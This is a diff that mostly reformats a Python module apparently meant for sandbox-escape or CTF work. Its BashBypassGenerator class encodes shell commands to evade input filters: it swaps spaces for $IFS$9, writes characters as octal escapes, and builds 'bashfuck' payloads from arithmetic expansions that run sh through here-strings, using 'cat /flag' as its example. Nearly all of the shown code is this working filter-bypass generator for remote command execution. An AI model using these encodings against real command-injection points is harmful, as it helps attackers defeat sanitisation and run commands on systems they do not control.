@@ -1327,11 +1327,13 @@ class BypassGenerator:
         ast.fix_missing_locations(transformed_tree)
         return ast.unparse(transformed_tree)
 
+
 class BashBypassGenerator:
     """
     Bypasser only for RCE bash commands.
     'cat /flag' -> 'cat$IFS$9/flag'
     """
+
     def blank_to_ifs(self, payload: str) -> str:
         """
         ' ' -> $IFS$9
@@ -1342,78 +1344,80 @@ class BashBypassGenerator:
     # https://github.com/ProbiusOfficial/bashFuck
     # Copyright @ ProbiusOfficial, 2025
 
-    def get_oct(self, c):  # 将字符的ASCII值转换为二进制字符串，然后将其转换为八进制，去掉前缀“0o”
+    def get_oct(
+        self, c
+    ):  # 将字符的ASCII值转换为二进制字符串，然后将其转换为八进制，去掉前缀“0o”
         return (oct(ord(c)))[2:]
 
-
     def nomal_otc(self, cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
-        if ' ' not in cmd:
-            payload = ''
+        if " " not in cmd:
+            payload = ""
             for c in cmd:
-                payload += '\\' + self.get_oct(c)
+                payload += "\\" + self.get_oct(c)
             return payload
         # else return None in this func
 
     def common_otc(self, cmd):
-        payload = ''
+        payload = ""
         for c in cmd:
-            if c == ' ':
-                payload += ' '
+            if c == " ":
+                payload += " "
             else:
-                payload += '\\' + self.get_oct(c)
-        payload += ''
+                payload += "\\" + self.get_oct(c)
+        payload += ""
         return payload
 
     def bashfuck_x(self, cmd, form):
-        bash_str = ''
+        bash_str = ""
         for c in cmd:
-            bash_str += f'\\\\$(($((1<<1))#{bin(int(self.get_oct(c)))[2:]}))'
+            bash_str += f"\\\\$(($((1<<1))#{bin(int(self.get_oct(c)))[2:]}))"
         payload_bit = bash_str
-        payload_zero = bash_str.replace('1', '${##}')  # 用 ${##} 来替换 1
-        payload_c = bash_str.replace('1', '${##}').replace('0', '${#}')  # 用 ${#} 来替换 0
-        if form == 'bit':
-            payload_bit = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_bit + '\\\''
+        payload_zero = bash_str.replace("1", "${##}")  # 用 ${##} 来替换 1
+        payload_c = bash_str.replace("1", "${##}").replace(
+            "0", "${#}"
+        )  # 用 ${#} 来替换 0
+        if form == "bit":
+            payload_bit = "$0<<<$0\\<\\<\\<\\$\\'" + payload_bit + "\\'"
             return payload_bit
-        elif form == 'zero':
-            payload_zero = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_zero + '\\\''
+        elif form == "zero":
+            payload_zero = "$0<<<$0\\<\\<\\<\\$\\'" + payload_zero + "\\'"
             return payload_zero
-        elif form == 'c':
-            payload_c = '${!#}<<<${!#}\\<\\<\\<\\$\\\'' + payload_c + '\\\''
+        elif form == "c":
+            payload_c = "${!#}<<<${!#}\\<\\<\\<\\$\\'" + payload_c + "\\'"
             return payload_c
-
 
     def bashfuck_y(self, cmd):
         oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
-            '$(())',  # 0
-            '$((~$(($((~$(())))$((~$(())))))))',  # 1
-            '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
-            '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
-            '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
-            '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
-            '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
-            '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
+            "$(())",  # 0
+            "$((~$(($((~$(())))$((~$(())))))))",  # 1
+            "$((~$(($((~$(())))$((~$(())))$((~$(())))))))",  # 2
+            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  # 3
+            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  # 4
+            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  # 5
+            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  # 6
+            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  # 7
         ]
-        bashFuck = ''
-        bashFuck += '__=$(())'  # set __ to 0
-        bashFuck += '&&'  # splicing
-        bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'
+        bashFuck = ""
+        bashFuck += "__=$(())"  # set __ to 0
+        bashFuck += "&&"  # splicing
+        bashFuck += "${!__}<<<${!__}\\<\\<\\<\\$\\'"  # got 'sh'
 
         for c in cmd:
-            bashFuck += '\\\\'
+            bashFuck += "\\\\"
             for i in self.get_oct(c):
                 bashFuck += oct_list[int(i)]
 
-        bashFuck += '\\\''
+        bashFuck += "\\'"
 
         return bashFuck
-    
+
     def interactive(self, cmd):
         from .Typhon import interactive_
+
         if interactive_:
-            return '$0'
+            return "$0"
         else:
             return None
-
 
     def Generate(self, cmd):
         yield cmd
